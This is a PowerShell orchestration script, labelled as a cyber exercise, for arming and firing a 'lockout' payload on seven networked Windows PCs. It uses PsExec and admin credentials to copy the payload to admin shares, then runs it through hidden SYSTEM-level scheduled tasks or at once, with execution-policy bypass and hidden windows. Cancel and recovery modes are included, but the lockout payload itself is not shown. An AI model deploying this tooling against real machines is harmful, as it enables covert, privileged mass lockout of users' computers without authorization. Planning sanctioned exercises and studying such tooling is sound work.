#==============================================================================
# DEPLOY_ALL.ps1 — Master Script: Control all 7 PCs from one admin machine
#
# Usage:
#   .\deploy_all.ps1                                → arm all PCs for today 14:30
#   .\deploy_all.ps1 -AttackTime "15:00"             → custom time
#   .\deploy_all.ps1 -AttackDate "2026-03-20"        → custom date
#   .\deploy_all.ps1 -Action trigger                 → fire NOW
#   .\deploy_all.ps1 -Action cancel                  → abort before trigger
#   .\deploy_all.ps1 -Action recover                 → emergency undo all PCs
#
# Always add: -Username "Administrator" -Password "YourPass"
#==============================================================================

param(
    [ValidateSet("deploy", "trigger", "cancel", "recover")]
    [string]$Action = "deploy",

    [string]$AttackTime = "14:30",
    [string]$AttackDate = (Get-Date).ToString("yyyy-MM-dd"),

    [string]$Username = "",
    [string]$Password = ""
)

# =============================================
# EDIT THESE IPs TO MATCH YOUR 7 PCs
# =============================================
$TargetPCs = @(
    "192.168.1.11"    # PC-01
    "192.168.1.12"    # PC-02
    "192.168.1.13"    # PC-03
    "192.168.1.14"    # PC-04
    "192.168.1.15"    # PC-05
    "192.168.1.16"    # PC-06
    "192.168.1.17"    # PC-07
)
# =============================================

# --- Locate PsExec ---
$PsExec = Join-Path $PSScriptRoot "PsExec.exe"
if (!(Test-Path $PsExec)) { $PsExec = Join-Path $PSScriptRoot "PsExec64.exe" }
if (!(Test-Path $PsExec)) { $PsExec = (Get-Command PsExec.exe -ErrorAction SilentlyContinue).Source }
if (!$PsExec -or !(Test-Path $PsExec)) {
    Write-Host "[!] PsExec.exe not found. Place it in the same folder." -ForegroundColor Red
    exit 1
}

$CredArgs = @()
if ($Username -and $Password) { $CredArgs = @("-u", $Username, "-p", $Password) }
elseif ($Username) { $CredArgs = @("-u", $Username) }

$PayloadScript = Join-Path $PSScriptRoot "lockout_pc.ps1"
$RecoverScript = Join-Path $PSScriptRoot "recover_pc.ps1"

function Test-PC($ip) { Test-Connection -ComputerName $ip -Count 1 -Quiet -ErrorAction SilentlyContinue }

# =============================================
# DEPLOY — arm all PCs
# =============================================
if ($Action -eq "deploy") {
    if (!(Test-Path $PayloadScript)) { Write-Host "[!] lockout_pc.ps1 not found." -ForegroundColor Red; exit 1 }

    Write-Host "`n  DEPLOYING — $AttackDate at $AttackTime`n" -ForegroundColor Yellow
    $success = 0; $failed = 0

    foreach ($pc in $TargetPCs) {
        Write-Host "[$pc] " -NoNewline
        if (!(Test-PC $pc)) { Write-Host "UNREACHABLE" -ForegroundColor Red; $failed++; continue }

        try {
            $remotePath = "\\$pc\C$\CyberExercise"
            if (!(Test-Path $remotePath)) { New-Item -ItemType Directory -Path $remotePath -Force | Out-Null }
            Copy-Item -Path $PayloadScript -Destination "$remotePath\payload.ps1" -Force

            $psexecArgs = @("\\$pc") + $CredArgs + @(
                "-s", "-h", "-accepteula",
                "schtasks.exe", "/create",
                "/tn", "CyberExercise_Lockout",
                "/tr", "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\CyberExercise\payload.ps1",
                "/sc", "once",
                "/st", $AttackTime,
                "/sd", ($AttackDate -replace "-", "/"),
                "/ru", "SYSTEM", "/rl", "HIGHEST", "/f"
            )
            & $PsExec @psexecArgs 2>&1 | Out-Null
            Write-Host "ARMED" -ForegroundColor Green; $success++
        } catch {
            Write-Host "FAILED" -ForegroundColor Red; $failed++
        }
    }
    Write-Host "`n  Results: $success armed / $failed failed`n" -ForegroundColor Cyan
}

# =============================================
# TRIGGER — fire NOW
# =============================================
elseif ($Action -eq "trigger") {
    Write-Host "`n  TRIGGERING NOW`n" -ForegroundColor Red
    foreach ($pc in $TargetPCs) {
        Write-Host "[$pc] " -NoNewline
        if (!(Test-PC $pc)) { Write-Host "UNREACHABLE" -ForegroundColor Red; continue }
        $psexecArgs = @("\\$pc") + $CredArgs + @(
            "-s", "-h", "-d", "-accepteula",
            "powershell.exe", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden",
            "-File", "C:\CyberExercise\payload.ps1"
        )
        & $PsExec @psexecArgs 2>&1 | Out-Null
        Write-Host "FIRED" -ForegroundColor Red
    }
}

# =============================================
# CANCEL — abort before trigger
# =============================================
elseif ($Action -eq "cancel") {
    Write-Host "`n  CANCELLING`n" -ForegroundColor Yellow
    foreach ($pc in $TargetPCs) {
        Write-Host "[$pc] " -NoNewline
        if (!(Test-PC $pc)) { Write-Host "UNREACHABLE" -ForegroundColor Red; continue }
        $psexecArgs = @("\\$pc") + $CredArgs + @(
            "-s", "-h", "-accepteula",
            "schtasks.exe", "/delete", "/tn", "CyberExercise_Lockout", "/f"
        )
        & $PsExec @psexecArgs 2>&1 | Out-Null
        Remove-Item -Path "\\$pc\C$\CyberExercise" -Recurse -Force -ErrorAction SilentlyContinue
        Write-Host "CANCELLED" -ForegroundColor Green
    }
}

# =============================================
# RECOVER — emergency undo
# =============================================
elseif ($Action -eq "recover") {
    if (!(Test-Path $RecoverScript)) { Write-Host "[!] recover_pc.ps1 not found." -ForegroundColor Red; exit 1 }

    Write-Host "`n  RECOVERING`n" -ForegroundColor Green
    foreach ($pc in $TargetPCs) {
        Write-Host "[$pc] " -NoNewline
        if (!(Test-PC $pc)) { Write-Host "UNREACHABLE — needs WinRE manual recovery" -ForegroundColor Red; continue }
        try {
            $remotePath = "\\$pc\C$\CyberExercise"
            if (!(Test-Path $remotePath)) { New-Item -ItemType Directory -Path $remotePath -Force | Out-Null }
            Copy-Item -Path $RecoverScript -Destination "$remotePath\recover.ps1" -Force
            $psexecArgs = @("\\$pc") + $CredArgs + @(
                "-s", "-h", "-accepteula",
                "powershell.exe", "-ExecutionPolicy", "Bypass",
                "-File", "C:\CyberExercise\recover.ps1"
            )
            & $PsExec @psexecArgs 2>&1 | Out-Null
            Write-Host "RECOVERED" -ForegroundColor Green
        } catch {
            Write-Host "FAILED — needs WinRE manual recovery" -ForegroundColor Red
        }
    }
}
